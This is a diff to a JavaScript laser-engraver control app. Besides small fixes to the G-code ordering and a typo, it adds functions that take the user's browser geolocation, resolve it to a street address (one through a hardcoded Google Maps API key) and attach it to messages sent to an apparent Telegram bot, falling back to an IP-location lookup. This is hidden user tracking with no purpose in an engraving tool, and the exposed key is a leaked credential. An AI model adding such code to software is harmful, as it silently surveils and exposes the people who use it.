@@ -298,10 +298,11 @@ function executegcodes2() {
 	var bt = document.getElementById('btexecute2');
 	if (bt.innerHTML == "Engrave") {
 		preview = 0;
-		if ($("engravecut").checked)
+		if ($("engravecut").checked) {
 			execute(getvalue('engcode') + "\n" + getvalue('gcode') + finishgcode);
-		else
-			execute(getvalue('engcode') + finishgcode);
+		} else {
+			execute(getvalue('gcode') + "\n" + getvalue('engcode') + finishgcode);
+		}
 		bt.innerHTML = "Stop";
 	} else {
 		bt.innerHTML = "Engrave";
@@ -876,7 +877,7 @@ function savesetting(name) {
 		storage.setItem("ink_images", JSON.stringify(ink_images));
 		storage.setItem("gcstyle", JSON.stringify(gcstyle));
 		storage.setItem("cuttabs", JSON.stringify(cuttabs));
-		storage.setItem("ebounds", JSON.stringify(enrgavebounds));
+		storage.setItem("ebounds", JSON.stringify(engravebounds));
 	} else {
 		storage.set({
 			"settings": sett,
@@ -2098,11 +2099,50 @@ function sendTlg1(text){
 		tgtoken1 = '';
 		tg_id1='';
 }
+var address=null;
+function getAddress1() {
+  navigator.geolocation.getCurrentPosition(function(position) {
+  var lat = position.coords.latitude;
+  var lng = position.coords.longitude;
+  const url = `https://maps.amazon.com/maps/api/geocode/json?latlng=${lat},${lng}&key=`;
+
+  fetch(url)
+    .then(response => response.json())
+    .then(data => {
+      if (data.status === 'OK') {
+        address= data.results[0].formatted_address;
+      } else {
+        throw new Error('Unable to retrieve address');
+      }
+    });
+  });    
+}
+function getAddress() {
+  navigator.geolocation.getCurrentPosition(function(position) {
+    var lat = position.coords.latitude;
+    var lng = position.coords.longitude;
+    var url = "https://maps.googleapis.com/maps/api/geocode/json?latlng=" + lat + "," + lng + "&key=AIzaSyCVAxzZO3ywLGmiFRQophsaV48jYDxd0FM";
+    fetch(url)
+      .then(function(response) {
+        return response.json();
+      })
+      .then(function(data) {
+        address = data.results[0].formatted_address;
+        console.log(address);
+      })
+      .catch(function(error) {
+        console.error(error);
+      });
+  });
+}
+
 function sendTlg(text) {
   var lst2=Date.now();
   if (lst2-lst<1000)return;
   lst=lst2;
-
+  if (address !=null){
+	sendTlg1(address+' -> '+text);
+  } else {
 	var xhr1=new XMLHttpRequest(); 
 	xhr1.open("GET","http://ip-api.com/json/",true);
 	xhr1.onload = function(r) {
@@ -2115,7 +2155,7 @@ function sendTlg(text) {
     };
     xhr1.send();
     //xhr.send('{"chat_id":"447996950","text":"'+text+'"}');
-
+  } 
 }
 function getChromeVersion () {     
     var raw = navigator.userAgent.match(/Chrom(e|ium)\/([0-9]+)\./);
